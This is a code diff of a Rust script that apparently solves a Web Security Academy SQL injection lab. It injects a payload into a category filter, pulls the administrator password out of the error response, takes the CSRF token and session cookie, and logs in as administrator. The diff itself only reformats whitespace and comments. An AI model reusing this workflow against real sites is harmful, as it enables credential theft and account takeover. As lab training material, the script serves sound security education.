@@ -39,6 +39,7 @@ use text_colorizer::Colorize;
 fn main() {
     // change this to your lab URL
     let url = "https://0a26002f043b16d3812b9446003d00aa.web-security-academy.net";
+
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
@@ -56,6 +57,7 @@ fn main() {
         "1. Injecting payload to retrieve the administrator password.. ".white()
     );
     io::stdout().flush();
+
     // fetch the page with the injected payload
     let injection = client
         .get(format!("{url}/filter?category=Pets"))
@@ -65,36 +67,40 @@ fn main() {
             "{}",
             "[!] Failed to retrieve the administrator password with the injected payload".red()
         ));
+
     println!("{}", "OK".green());
 
-    // body of the response
+    // get the body of the response
     let body = injection.text().unwrap();
+
     // extract administrator pasword
     let admin_password = capture_pattern("integer: \"(.*)\"", &body).expect(&format!(
         "{}",
         "[!] Failed to extract the administrator password".red()
     ));
+
     println!(
         "{} {} = > {}",
         "2. Extracting administrator password.. ".white(),
         "OK".green(),
         admin_password.yellow()
     );
-
     print!("{}", "3. Fetching login page.. ".white());
     io::stdout().flush();
+
     // fetch the login page
     let fetch_login = client
         .get(format!("{url}/login"))
         .send()
         .expect(&format!("{}", "[!] Failed to fetch login page".red()));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     print!(
         "{}",
         "4. Extracting csrf token and session cookie.. ".white()
     );
     io::stdout().flush();
+
     // extract session cookie
     let session = extract_session_multiple_cookies(fetch_login.headers())
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
@@ -102,10 +108,11 @@ fn main() {
     // extract csrf token
     let csrf =
         extract_csrf(fetch_login).expect(&format!("{}", "[!] Failed to extract csrf token".red()));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     print!("{}", "5. Logging in as the administrator.. ".white(),);
     io::stdout().flush();
+
     // login as the administrator
     let admin_login = client
         .post(format!("{url}/login"))
@@ -120,6 +127,7 @@ fn main() {
             "{}",
             "[!] Failed to login as the administrator".red()
         ));
+
     println!("{}", "OK".green());
 
     // extract the new session
@@ -128,9 +136,10 @@ fn main() {
         "[!] Failed to extract new session cookie".red()
     ));
 
-    // fetch administrator page
     print!("{}", "6. Fetching the administrator profile.. ".white(),);
     io::stdout().flush();
+
+    // fetch administrator page
     let admin = client
         .get(format!("{url}/my-account"))
         .header("Cookie", format!("session={new_session}"))
@@ -139,8 +148,8 @@ fn main() {
             "{}",
             "[!] Failed to fetch administrator profile".red()
         ));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     println!(
         "{} {}",
         "🗹 Check your browser, it should be marked now as"
